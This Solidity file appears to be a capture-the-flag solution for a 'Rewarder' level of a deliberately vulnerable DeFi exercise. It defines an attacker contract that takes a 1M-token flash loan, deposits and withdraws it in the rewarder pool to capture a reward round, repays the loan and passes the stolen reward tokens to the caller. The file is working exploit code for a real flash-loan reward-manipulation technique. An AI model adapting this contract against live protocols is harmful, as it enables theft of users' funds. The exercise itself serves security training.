// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";

contract RewarderAttacker {
    FlashLoanerPool private flashLoanerPool;
    TheRewarderPool private rewarderPool;
    DamnValuableToken private dvtToken;
    RewardToken private rewardToken;

    constructor(
        address flashLoanerPoolAddress,
        address rewarderPoolAddress,
        address dvtTokenAddress,
        address rewardTokenAddress
    ) {
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        dvtToken = DamnValuableToken(dvtTokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function attack() public {
        // flash loan 1M DVT
        flashLoanerPool.flashLoan(1000000 ether);
    }

    function receiveFlashLoan(uint256 amountReceived) public {
        dvtToken.approve(address(rewarderPool), amountReceived);
        // deposit the received token amount
        // method should be called so that isNewRewardsRound() is true
        rewarderPool.deposit(amountReceived);
        // withdraw - the total supply shouldn't correctly update after this operation
        rewarderPool.withdraw(amountReceived);
        // pay back the loan
        dvtToken.transfer(
            address(flashLoanerPool),
            dvtToken.balanceOf(address(this))
        );
        // send reward tokens received to msg.sender
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}
